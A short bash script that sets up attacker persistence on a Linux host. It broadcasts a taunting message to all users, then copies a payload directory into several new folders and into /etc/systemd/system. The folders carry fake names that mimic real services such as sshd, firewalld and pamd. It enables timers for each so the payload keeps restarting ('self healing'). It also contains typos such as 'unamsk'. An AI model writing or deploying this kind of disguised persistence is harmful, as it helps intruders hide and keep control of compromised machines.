#! /bin/bash

# The cow says Cope
figlet "Cope" | /usr/games/cowsay -nsw | wall

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-printerd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-pamd/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-printerd/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unamsk systemd-bootd.service \
	systemd-firewalld.service \
	systemd-issued.service \
	systemd-maild.service \
	systemd-pamd.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
